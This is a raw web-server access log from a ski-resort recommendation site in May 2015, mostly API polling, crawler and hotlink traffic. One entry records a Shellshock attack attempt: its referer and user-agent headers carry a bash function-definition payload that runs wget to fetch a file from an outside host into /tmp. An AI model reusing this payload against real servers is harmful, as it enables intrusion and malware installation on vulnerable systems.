170.75.162.130 - - [25/May/2015:17:52:27 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 994 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:27 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1096 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:27 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1066 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1073 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1102 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1050 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1069 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1020 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:28 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1040 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:52:29 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1023 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:17:57:17 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 985 "-" "node-superagent/0.18.2"
70.214.0.13 - - [25/May/2015:17:59:50 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; Android 5.0; SM-N900V Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
123.125.71.85 - - [25/May/2015:18:01:48 -0700] "-" 408 0 "-" "-"
85.21.233.180 - - [25/May/2015:18:07:25 -0700] "GET / HTTP/1.1" 200 2376 "-" "gettor/0.5"
220.181.108.142 - - [25/May/2015:18:07:36 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [25/May/2015:18:10:58 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 988 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:18:11:38 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1060 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:18:11:38 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 1025 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:18:11:38 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 973 "-" "node-superagent/0.18.2"
46.229.164.102 - - [25/May/2015:18:13:00 -0700] "GET /resorts?resort=pomerelle HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
118.238.246.167 - - [25/May/2015:18:22:49 -0700] "GET / HTTP/1.1" 200 2376 "https://www.google.co.jp/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19316 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /images/logo-sm.png HTTP/1.1" 200 16738 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:50 -0700] "GET /favicon.ico HTTP/1.1" 200 1475 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:51 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1809 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:22:52 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 537 "http://whereshouldiski.com/styles/0fffd548.main.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
118.238.246.167 - - [25/May/2015:18:23:12 -0700] "GET /lib/reccapi.php?fields=t&coords=35.92653860000001,139.4384412 HTTP/1.1" 200 1860 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
170.75.162.130 - - [25/May/2015:18:24:19 -0700] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 910 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:18:31:40 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1073 "-" "node-superagent/0.18.2"
123.125.71.16 - - [25/May/2015:18:35:43 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
123.125.71.103 - - [25/May/2015:18:59:19 -0700] "-" 408 0 "-" "-"
220.181.108.185 - - [25/May/2015:19:05:32 -0700] "-" 408 0 "-" "-"
178.255.215.81 - - [25/May/2015:19:06:53 -0700] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.81 - - [25/May/2015:19:06:53 -0700] "GET /resorts?resort=snowsummitmountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
46.229.164.114 - - [25/May/2015:19:10:22 -0700] "GET /resorts?resort=brianhead HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
46.229.164.113 - - [25/May/2015:19:28:13 -0700] "GET /resorts?resort=49degreesnorth HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:19:29:03 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 990 "-" "node-superagent/0.18.2"
46.229.164.111 - - [25/May/2015:19:41:14 -0700] "GET /resorts?resort=schweitzer HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:19:42:24 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1103 "-" "node-superagent/0.18.2"
49.183.160.215 - - [25/May/2015:19:49:20 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
46.229.164.113 - - [25/May/2015:19:50:17 -0700] "GET /resorts?resort=sunlight HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
107.178.192.196 - - [25/May/2015:19:50:59 -0700] "GET / HTTP/1.1" 200 2376 "-" "AppEngine-Google; (+http://code.google.com/appengine; appid: tycko-gc)"
107.178.192.252 - - [25/May/2015:19:51:03 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19317 "-" "AppEngine-Google; (+http://code.google.com/appengine; appid: tycko-gc)"
107.178.192.192 - - [25/May/2015:19:51:05 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "-" "AppEngine-Google; (+http://code.google.com/appengine; appid: tycko-gc)"
107.178.192.192 - - [25/May/2015:19:51:05 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6701 "-" "AppEngine-Google; (+http://code.google.com/appengine; appid: tycko-gc)"
170.75.162.130 - - [25/May/2015:19:51:14 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1019 "-" "node-superagent/0.18.2"
46.229.164.114 - - [25/May/2015:19:59:21 -0700] "GET /resorts?resort=snowmass HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
66.249.75.79 - - [25/May/2015:19:59:57 -0700] "GET /resorts?resort=bridgerbowl&date=2013-06-14 HTTP/1.1" 404 509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
206.217.199.185 - - [25/May/2015:20:02:02 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0"
123.125.71.89 - - [25/May/2015:20:05:12 -0700] "-" 408 0 "-" "-"
46.229.164.114 - - [25/May/2015:20:07:32 -0700] "GET /resorts?resort=jaypeak HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
220.181.108.114 - - [25/May/2015:20:10:15 -0700] "-" 408 0 "-" "-"
46.229.164.111 - - [25/May/2015:20:16:50 -0700] "GET /resorts?resort=sipapu HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
46.229.164.111 - - [25/May/2015:20:26:33 -0700] "GET /resorts?resort=bogusbasin HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
46.229.164.113 - - [25/May/2015:20:38:10 -0700] "GET /resorts?resort=lasvegasskiandsnowboard HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
180.76.15.143 - - [25/May/2015:20:39:05 -0700] "GET /resorts?resort=mountwashingtonalpine&date=2014-01-05 HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
24.121.121.207 - - [25/May/2015:20:46:12 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
74.89.230.184 - - [25/May/2015:20:46:42 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10"
123.125.71.87 - - [25/May/2015:20:48:21 -0700] "-" 408 0 "-" "-"
46.229.164.111 - - [25/May/2015:20:48:39 -0700] "GET /resorts?resort=huntermountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
72.47.20.26 - - [25/May/2015:20:48:56 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
220.181.108.82 - - [25/May/2015:20:53:25 -0700] "-" 408 0 "-" "-"
46.229.164.99 - - [25/May/2015:20:58:58 -0700] "GET /resorts?resort=mountwashingtonalpine HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
46.229.164.99 - - [25/May/2015:21:11:46 -0700] "GET /resorts?resort=hurricaneridge HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
71.83.114.200 - - [25/May/2015:21:11:57 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4"
23.122.135.18 - - [25/May/2015:21:22:08 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
99.40.7.18 - - [25/May/2015:21:24:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko"
99.40.7.18 - - [25/May/2015:21:24:39 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [25/May/2015:21:26:51 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 992 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:21:33:31 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 924 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:21:33:31 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 899 "-" "node-superagent/0.18.2"
46.229.164.102 - - [25/May/2015:21:38:04 -0700] "GET /resorts?resort=blacktailmountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
195.222.141.124 - - [25/May/2015:21:40:36 -0700] "GET / HTTP/1.0" 200 6151 "() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=35342e3234352e3233322e3437\"" "() { :;}; /bin/bash -c \"wget -O /tmp/bbb dprftp.asuscomm.com/novo.php?ip=35342e3234352e3233322e3437\""
123.125.71.76 - - [25/May/2015:21:48:11 -0700] "-" 408 0 "-" "-"
46.229.164.102 - - [25/May/2015:21:52:53 -0700] "GET /resorts?resort=brundage HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
220.181.108.156 - - [25/May/2015:21:54:36 -0700] "-" 408 0 "-" "-"
50.152.249.158 - - [25/May/2015:22:03:42 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
170.75.162.130 - - [25/May/2015:22:04:13 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1102 "-" "node-superagent/0.18.2"
46.229.164.114 - - [25/May/2015:22:07:05 -0700] "GET /resorts?resort=sugarloaf HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:22:18:54 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 1029 "-" "node-superagent/0.18.2"
46.229.164.114 - - [25/May/2015:22:20:27 -0700] "GET /resorts?resort=telluride HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
96.38.139.198 - - [25/May/2015:22:24:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
96.38.139.198 - - [25/May/2015:22:24:28 -0700] "-" 408 0 "-" "-"
24.5.227.132 - - [25/May/2015:22:24:39 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko"
24.5.227.132 - - [25/May/2015:22:25:01 -0700] "-" 408 0 "-" "-"
96.38.139.198 - - [25/May/2015:22:26:11 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1021 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 973 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1016 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1031 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 958 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:44 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 972 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:45 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1104 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:27:45 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 953 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:30:25 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1002 "-" "node-superagent/0.18.2"
46.229.164.102 - - [25/May/2015:22:32:22 -0700] "GET /resorts?resort=portillo HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:22:32:25 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1060 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:32:25 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1061 "-" "node-superagent/0.18.2"
50.173.144.67 - - [25/May/2015:22:35:46 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
46.229.164.114 - - [25/May/2015:22:40:57 -0700] "GET /resorts?resort=homewoodmountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:22:45:06 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1024 "-" "node-superagent/0.18.2"
45.79.1.111 - - [25/May/2015:22:46:41 -0700] "GET / HTTP/1.1" 200 2320 "-" "python-requests/2.2.1 CPython/2.7.6 Linux/4.0.4-x86_64-linode57"
46.229.164.102 - - [25/May/2015:22:49:37 -0700] "GET /resorts?resort=redriver HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:22:54:06 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 1031 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:54:06 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1041 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:54:06 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 1009 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:22:54:06 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1023 "-" "node-superagent/0.18.2"
46.229.164.114 - - [25/May/2015:22:57:53 -0700] "GET /resorts?resort=pebblecreek HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
123.125.71.77 - - [25/May/2015:22:58:07 -0700] "-" 408 0 "-" "-"
180.76.15.22 - - [25/May/2015:23:01:06 -0700] "GET /resorts?resort=whitefacemountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.6 - - [25/May/2015:23:02:20 -0700] "GET /resorts?resort=whitewater&date=2014-05-03 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.111 - - [25/May/2015:23:03:40 -0700] "-" 408 0 "-" "-"
46.229.164.114 - - [25/May/2015:23:07:03 -0700] "GET /resorts?resort=titusmountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
184.157.65.71 - - [25/May/2015:23:08:28 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
46.229.164.113 - - [25/May/2015:23:16:01 -0700] "GET /resorts?resort=mt.shasta HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:23:21:18 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 972 "-" "node-superagent/0.18.2"
170.75.162.130 - - [25/May/2015:23:23:18 -0700] "GET /lib/reccapi.php?resort=canyons HTTP/1.1" 200 996 "-" "node-superagent/0.18.2"
46.229.164.111 - - [25/May/2015:23:24:21 -0700] "GET /resorts?resort=mountbohemia HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:23:25:28 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1083 "-" "node-superagent/0.18.2"
46.229.164.111 - - [25/May/2015:23:32:47 -0700] "GET /resorts?resort=mountspokane HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [25/May/2015:23:38:19 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1018 "-" "node-superagent/0.18.2"
46.229.164.111 - - [25/May/2015:23:41:52 -0700] "GET /resorts?resort=wildcatmountain HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
71.210.28.86 - - [25/May/2015:23:49:54 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
170.75.162.130 - - [25/May/2015:23:51:40 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1003 "-" "node-superagent/0.18.2"
46.229.164.113 - - [25/May/2015:23:53:13 -0700] "GET /resorts?resort=sugarbowl HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
123.125.71.102 - - [25/May/2015:23:54:43 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [25/May/2015:23:57:00 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 932 "-" "node-superagent/0.18.2"
220.181.108.110 - - [25/May/2015:23:57:12 -0700] "-" 408 0 "-" "-"
188.138.1.218 - - [25/May/2015:23:58:28 -0700] "GET / HTTP/1.1" 200 6095 "-" "-"
188.138.1.218 - - [25/May/2015:23:58:28 -0700] "GET /robots.txt HTTP/1.1" 200 319 "-" "-"
46.229.164.111 - - [26/May/2015:00:09:24 -0700] "GET /resorts?resort=deervalley HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [26/May/2015:00:11:11 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1041 "-" "node-superagent/0.18.2"
170.75.162.130 - - [26/May/2015:00:27:42 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1109 "-" "node-superagent/0.18.2"
170.75.162.130 - - [26/May/2015:00:28:22 -0700] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1000 "-" "node-superagent/0.18.2"
46.229.164.111 - - [26/May/2015:00:31:42 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
170.75.162.130 - - [26/May/2015:00:32:12 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 998 "-" "node-superagent/0.18.2"
107.170.191.28 - - [26/May/2015:00:34:25 -0700] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )"
107.170.191.28 - - [26/May/2015:00:34:30 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )"
